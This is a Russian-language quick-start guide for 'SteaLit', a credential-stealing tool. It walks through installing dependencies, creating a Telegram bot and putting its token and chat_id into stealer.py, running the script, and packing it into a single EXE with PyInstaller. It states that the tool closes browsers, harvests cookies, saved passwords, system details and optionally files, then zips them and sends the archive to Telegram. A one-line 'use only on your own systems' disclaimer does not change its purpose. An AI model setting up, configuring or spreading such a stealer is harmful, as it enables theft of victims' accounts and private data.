# 🚀 Быстрый старт SteaLit

## 1. Установка зависимостей
```bash
pip install -r reqs.txt
```

## 2. Настройка Telegram бота

### Создание бота:
1. Найдите @BotFather в Telegram
2. Отправьте `/newbot`
3. Следуйте инструкциям
4. Получите `bot_token`

### Получение chat_id:
1. Добавьте бота в чат или напишите ему
2. Перейдите по ссылке: `https://api.telegram.org/bot<ВАШ_TOKEN>/getUpdates`
3. Найдите `chat.id` в ответе

### Настройка в коде:
Отредактируйте `stealer.py`, строки 21-24:
```python
"telegram": {
    "bot_token": "ВАШ_BOT_TOKEN_ЗДЕСЬ",
    "chat_id": "ВАШ_CHAT_ID_ЗДЕСЬ"
},
```

## 3. Запуск
```bash
python stealer.py
```

## 4. Что произойдет:
1. ✅ Закроются браузеры
2. ✅ Соберутся cookies и пароли
3. ✅ Соберется системная информация
4. ✅ Создастся ZIP архив
5. ✅ Архив отправится в Telegram

## 5. Создание EXE (опционально)
```bash
pip install pyinstaller
pyinstaller --onefile --add-data "modules;modules" stealer.py
```
EXE файл будет в папке `dist/`

## ⚠️ Важно:
- Закройте браузеры перед запуском
- Запускайте от имени пользователя (не администратора)
- Используйте только на своих системах

## 🔧 Настройка плагинов:
В `stealer.py` можете включить/выключить модули:
```python
"plugins": {
    "Cookies Extractor": True,      # Включено
    "Passwords Extractor": True,    # Включено
    "User Information": True,       # Включено
    "Process List": True,           # Включено
    "Installed Software": True,     # Включено
    "File Grabber": False,          # Выключено (может быть большим)
}
```

---
**Время выполнения**: ~30-60 секунд  
**Размер архива**: обычно 1-5 МБ (без File Grabber)
